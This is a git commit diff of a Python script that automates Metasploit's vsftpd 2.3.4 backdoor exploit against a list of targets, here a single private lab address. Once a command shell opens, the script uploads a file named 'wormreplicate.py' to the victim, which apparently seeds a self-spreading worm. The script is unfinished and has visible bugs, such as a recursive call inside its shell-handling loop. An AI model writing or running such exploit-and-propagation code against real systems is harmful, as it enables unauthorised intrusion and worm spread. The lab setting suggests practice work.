8f30961390ed20c12fabf9258a565a7b7d8214cd
peytonrayne <51815710+peytonrayne@users.noreply.github.com>
2021-07-08 21:29:32 -0400

    Update msftesting.py

--- msftesting.py
+++ msftesting.py
@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!python3
 from nclib import TCPServer
 import subprocess
 
@@ -15,12 +15,43 @@ def listener():
 		target_list = target_list.split(',')
 
 		print(target_list)
-		return target
+		return target_list
 
 def generate(target):
 	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
-	subprocess.run(["msfconsole", "-q", "-x", exploit])
+	print("post exploit")
+	process = subprocess.Popen(["msfconsole", "-q", "-x", exploit], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+	while True:
+		response = str(process.stdout.readline().rstrip())
+		print(response)
+		if "Command shell session 1 opened" in response:
+			response = str(process.stdout.readline().rstrip())
+			print(response)
+			print("inside if")
+			
+			byteshell = 'upload /home/peyton/Documents/Worm/wormreplicate.py /wormreplicate7.py'.encode('utf-8')
+			#byteshell = ''.encode('utf-8')
+			print(byteshell)
+			out = process.communicate(input=byteshell, timeout=1000)
+			
+			generate(target)#copy whole function, have it do the shell stuff
+			process.communicate(input=b'shell')
+			process.communicate(input=b'cd /; echo test > test')
+
+
+			#out = process.stdin.write(byteshell)
+
+			for i in out:
+				print(i)
+
+			print("after communicate", out)
+
+			break
+	#subprocess.PIPE("upload /home/peyton/Documents/Worm/wormreplicate.py /")
+	
 
 	
-target = listener()
-#generate(target)
+#target_list = listener()
+target_list = ['192.168.56.112']
+for target in target_list:
+	generate(target)
